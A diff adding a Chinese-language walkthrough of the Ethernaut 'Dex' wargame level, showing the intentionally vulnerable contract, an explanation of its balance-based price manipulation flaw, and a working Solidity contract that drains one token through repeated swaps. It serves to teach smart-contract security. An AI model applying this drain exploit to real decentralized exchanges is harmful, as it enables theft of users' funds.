@@ -3,6 +3,7 @@ title: OpenZeppelin：Ethernaut
 tags:
     - blockchain
     - smart contract
+    - solidity
 ---
 
 ## 0. Hello Ethernaut
@@ -1632,3 +1633,109 @@ contract Shop {
       }
     }
     ```
+
+## 22. Dex
+
+- 至少清空 [DEX](https://en.wikipedia.org/wiki/Decentralized_exchange) 合约中的一种代币
+- 合约 `Dex` 每种代币初始各 100 枚，玩家每种代币初始各 10 枚
+
+```js
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
+import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
+import 'openzeppelin-contracts-08/access/Ownable.sol';
+
+contract Dex is Ownable {
+  address public token1;
+  address public token2;
+  constructor() {}
+
+  function setTokens(address _token1, address _token2) public onlyOwner {
+    token1 = _token1;
+    token2 = _token2;
+  }
+  
+  function addLiquidity(address token_address, uint amount) public onlyOwner {
+    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
+  }
+  
+  function swap(address from, address to, uint amount) public {
+    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
+    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
+    uint swapAmount = getSwapPrice(from, to, amount);
+    IERC20(from).transferFrom(msg.sender, address(this), amount);
+    IERC20(to).approve(address(this), swapAmount);
+    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
+  }
+
+  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
+    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
+  }
+
+  function approve(address spender, uint amount) public {
+    SwappableToken(token1).approve(msg.sender, spender, amount);
+    SwappableToken(token2).approve(msg.sender, spender, amount);
+  }
+
+  function balanceOf(address token, address account) public view returns (uint){
+    return IERC20(token).balanceOf(account);
+  }
+}
+
+contract SwappableToken is ERC20 {
+  address private _dex;
+  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) {
+        _mint(msg.sender, initialSupply);
+        _dex = dexInstance;
+  }
+
+  function approve(address owner, address spender, uint256 amount) public {
+    require(owner != _dex, "InvalidApprover");
+    super._approve(owner, spender, amount);
+  }
+}
+```
+
+- 梳理合约 `Dex` 提供的代币互换方式
+    - 根据要交换的 `from` 代币的数量 `amount`、`Dex` 合约 `from` 和 `to` 代币的余额计算交换得到 `to` 代币的数量 `swapAmount`，即 `swapAmount = amount * to.balance / from.balance`
+    - 将要交换的 `from` 代币存入 `Dex` 合约，`swapAmount` 数量的 `to` 代币从 `Dex` 合约转出
+- 若首先将 10 枚 `token1` 转换为 `token2`，此时 `swapAmount` 为 10，`Dex` 合约 `token1` 的余额变为 110、`token2` 的余额变为 90，玩家将持有 20 枚 `token2` 代币，再将全部 `token2` 转为 `token1`，此时 `swapAmount` 提高到 24，可见不断进行代币互换即可清空 `Dex` 合约中的一种代币
+- 部署合约 `Hack`，并授权使用代币 `>> contract.approve("<hack-address>", 10)`
+
+    ```js
+    contract Hack {
+        function exploit(address instance) public {
+            Dex dex = Dex(instance);
+            address token1 = dex.token1();
+            address token2 = dex.token2();
+            IERC20(token1).transferFrom(msg.sender, address(this), 10);
+            IERC20(token2).transferFrom(msg.sender, address(this), 10);
+            while (dex.balanceOf(token1, instance) > 0 && dex.balanceOf(token2, instance) > 0) {
+                uint256 amount = dex.balanceOf(token1, address(this));  // 将持有的代币全部用于交换
+                if (amount > 0) {
+                    // 除第一次交换外，合约 Dex 的 to 代币的余额必为 110
+                    // 当 swapAmount 大于 Dex 合约 to 代币的余额时，说明本次交换能够清空 to 代币
+                    // 即可以获得 110 枚 to 代币，那么参与交换的 from 代币的数量应为
+                    // 110 * from.balance / to.balance = 110 * from.balance / 110 = from.balance
+                    if (dex.getSwapPrice(token1, token2, amount) > dex.balanceOf(token2, instance)) {
+                        amount = dex.balanceOf(token1, instance);
+                    }
+                    dex.approve(instance, amount);
+                    dex.swap(token1, token2, amount);
+                }
+                else {
+                    amount = dex.balanceOf(token2, address(this));
+                    if (dex.getSwapPrice(token2, token1, amount) > dex.balanceOf(token1, instance)) {
+                        amount = dex.balanceOf(token2, instance);
+                    }
+                    dex.approve(instance, amount);
+                    dex.swap(token2, token1, amount);
+                }
+            }
+        }
+    }
+    ```
+
+- 不应从单个来源获取价格或其它数据，可以借助于 Oracles，如 [Chainlink Data Feeds](https://docs.chain.link/docs/get-the-latest-price)
